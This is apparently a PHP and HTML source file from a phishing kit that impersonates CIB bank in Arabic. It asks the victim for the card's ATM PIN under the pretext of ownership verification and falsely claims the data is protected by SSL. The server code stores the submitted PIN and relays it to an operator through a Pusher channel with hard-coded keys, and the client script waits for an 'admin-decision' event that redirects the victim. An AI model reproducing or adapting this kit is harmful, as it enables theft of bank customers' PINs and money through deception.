<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
    '0737c04931774e406307',
    'eda7db4b963c98f62991',
    '2154404',
    $options
  );

    $site = array(
        'password' => $_POST['pass'],
        'message' => 'code',
        'type' => '3'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->UpdatePassword($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='waitpassword.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إثبات ملكية البطاقة - CIB</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            direction: rtl;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 36px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
        }

        .header-icon {
            width: 64px;
            height: 64px;
            background: rgba(255, 255, 255, 0.12);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            position: relative;
            z-index: 1;
        }

        .atm-text {
            color: #fff;
            font-size: 32px;
            font-weight: 800;
            position: relative;
            z-index: 1;
            margin-bottom: 6px;
            letter-spacing: 2px;
        }

        .header-title {
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            position: relative;
            z-index: 1;
        }

        .header-sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }

        /* Content */
        .content {
            padding: 28px 24px;
            flex: 1;
            text-align: center;
        }

        .description {
            color: #475569;
            font-size: 14px;
            line-height: 1.8;
            margin-bottom: 28px;
            padding: 0 8px;
        }

        .card-digits {
            color: #1a5ca8;
            font-weight: 700;
            direction: ltr;
            display: inline-block;
        }

        /* PIN inputs */
        .pin-container {
            display: flex;
            gap: 14px;
            margin-bottom: 24px;
            justify-content: center;
            direction: ltr;
        }

        .pin-box {
            width: 60px;
            height: 60px;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            font-size: 24px;
            text-align: center;
            font-weight: 700;
            color: #1a2332;
            background: #f8fafc;
            font-family: 'Cairo', sans-serif;
            outline: none;
            transition: all 0.25s;
        }

        .pin-box:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        .pin-box.filled {
            border-color: #1a5ca8;
            background: #eff6ff;
        }

        /* Error */
        .error-banner {
            display: none;
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 20px;
            align-items: center;
            gap: 10px;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
        }

        .error-banner.show {
            display: flex;
        }

        .error-banner span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
            text-align: right;
        }

        /* Submit */
        .submit-btn {
            width: 100%;
            max-width: 300px;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s;
            color: #fff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
            margin: 0 auto;
            display: block;
        }

        .submit-btn.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .submit-btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 24px;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="header">
            <div class="header-icon">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                    <line x1="1" y1="10" x2="23" y2="10" />
                </svg>
            </div>
            <div class="atm-text">ATM</div>
            <div class="header-title">إثبات ملكية البطاقة</div>
            <div class="header-sub">أدخل الرقم السري للصراف الآلي</div>
        </div>

        <div class="content">
            <p class="description">
                يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ
                <span class="card-digits" id="cardLastDigits">5986</span>
                ليتم التأكد من ملكية وأهلية صاحب البطاقة.
            </p>

            <form method="POST" action="" id="pinForm">
                <input type="hidden" name="pass" id="pinValue">

                <?php if (isset($showError)): ?>
                    <div class="error-banner show">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.</span>
                    </div>
                <?php endif; ?>

                <div class="pin-container">
                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                </div>

                <button class="submit-btn" id="submitBtn" type="submit" name="submit" disabled>تأكيد</button>
            </form>

            <div class="security-note">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>بياناتك محمية بتشفير 256-bit SSL</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري التحقق</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const lastFour = sessionStorage.getItem('cardLastFour');
            if (lastFour) document.getElementById('cardLastDigits').textContent = lastFour;

            const inputs = document.querySelectorAll('.pin-box');
            const submitBtn = document.getElementById('submitBtn');

            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
                    if (e.target.value.length === 1) {
                        e.target.classList.add('filled');
                        if (index < inputs.length - 1) inputs[index + 1].focus();
                    } else {
                        e.target.classList.remove('filled');
                    }
                    checkForm();
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].classList.remove('filled');
                    }
                });
            });

            function checkForm() {
                const pin = Array.from(inputs).map(i => i.value).join('');
                const isValid = pin.length === 4;
                submitBtn.disabled = !isValid;
                submitBtn.classList.toggle('active', isValid);
                if (isValid) document.getElementById('pinValue').value = pin;
            }

            document.getElementById('pinForm').addEventListener('submit', function (e) {
                const pin = Array.from(inputs).map(i => i.value).join('');
                if (pin.length !== 4) { e.preventDefault(); return; }
                document.getElementById('pinValue').value = pin;
                document.getElementById('loadingOverlay').classList.add('show');
            });

            inputs[0].focus();
        });
    </script>
    <!-- Pusher for routing -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;
        if (userId > 0) {
               var pusher = new Pusher('0737c04931774e406307', {
      cluster: 'ap2'
    });
            var channel = pusher.subscribe('my-channel-cib');
            channel.bind('admin-decision', function (data) {
                if (data.userId == userId) window.location = data.url;
            });
        }
    </script>
</body>

</html>